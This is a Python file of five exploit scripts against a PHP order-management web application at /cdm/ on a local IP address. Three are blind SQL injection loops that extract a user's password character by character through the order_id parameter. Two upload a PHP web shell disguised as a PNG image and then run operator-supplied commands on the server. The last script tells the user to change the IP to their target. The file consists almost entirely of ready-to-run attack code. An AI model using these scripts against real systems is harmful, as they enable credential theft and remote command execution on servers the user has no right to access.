#---------------first exploit------------
# import requests
# url = "http://192.168.1.103/cdm/user_order_customer_update.php"
# result = []
# for i in range(1,60):
#     for j in range(32, 128):
#         payload = f"(SELECT (CASE WHEN substr((select password from users where username='les'),{i},1)='{chr(j)}' THEN 1 ELSE (SELECT 6620 UNION SELECT 1568) END))"
#         data = {"order_status":"Order",
#         "order_id":payload}
#         response = requests.post(url, data=data)
#         if "Successfully" in response.text:
#             result.append(chr(j))
#             print("".join(result))
#             break




# ----------------second exploit------------
# import requests
# url = "http://192.168.1.103/cdm/user_delivery_update.php"
# result = []
# for i in range(1,60):
#     for j in range(32, 128):
#         payload = f"(SELECT (CASE WHEN substr((select binary(password) from users where username='les'),{i},1)='{chr(j)}' THEN 1 ELSE (SELECT 1189 UNION SELECT 9931) END))"
#         data = {"order_status":"Delivery",
#         "order_id":payload}
#         response = requests.post(url, data=data)
#         if "Successfully" in response.text:
#             result.append(chr(j))
#             print("".join(result))
#             break

# ----------------third exploit------------
# import requests
# url = "http://192.168.1.103/cdm/user_payment_update.php"
# php_payload = b'<?php passthru($_GET["c"]); ?>'
# filename="test2.php"
# files = {
#     "uploaded_file_cancelled": (filename, php_payload, "image/png"),
# }
# data = {
#     "order_id": "3123",
#     "payment_reference_number": "13123",
#     "payment_date": "2312-12-31",
#     "payment_remarks": "",
#     "warehouse_email": "aaa@ana.a",
#     "order_status": "Cancelled",
#     "cancellation_reason": "1",
# }
# response = requests.post(url, data=data, files=files)
# print("Response Body:", response.text)
# if response.status_code == 200:
#     print("[*] File uploaded successfully")
#     cmd = input("Enter command to execute: ")
#     response2 =requests.get(f'http://192.168.1.103/cdm/files/{filename}?c={cmd}')
#     print(response2.text)
# else:
#     print("[!] File upload failed")

# ----------------fourth exploit------------
# import requests
# url = "http://192.168.1.103/cdm/user_payment_update.php"
# result = []
# for i in range(1,60):
#     for j in range(32, 128):
#         payload = f"(SELECT (CASE WHEN substr((select binary(password) from users where username='les'),{i},1)='{chr(j)}' THEN 1 ELSE (SELECT 1189 UNION SELECT 9931) END))"
#         data = {"order_status":"Payment",
#         "order_id":payload}
#         response = requests.post(url, data=data)
#         if "Successfully" in response.text:
#             result.append(chr(j))
#             print("".join(result))
#             break


# ----------------fifth exploit------------
import requests
url = 'http://192.168.1.103/cdm/user_proposal_update_order.php' # change the ip address to your target
filename="mt_rand.php"
files = {
    'order_status': (None, 'Cancelled'),
    'uploaded_file_cancelled': (filename, '<?php passthru($_GET[\'c\']) ?>', 'image/png'),
}
response = requests.post(url, files=files)
print(response.text)
if response.status_code == 200:
    print("[*] File uploaded successfully")
    cmd = input("Enter command to execute: ")
    response2 =requests.get(f'http://192.168.1.103/cdm/files/{filename}?c={cmd}') # change the ip address to your target
    print(response2.text)
else:
    print("[!] File upload failed")
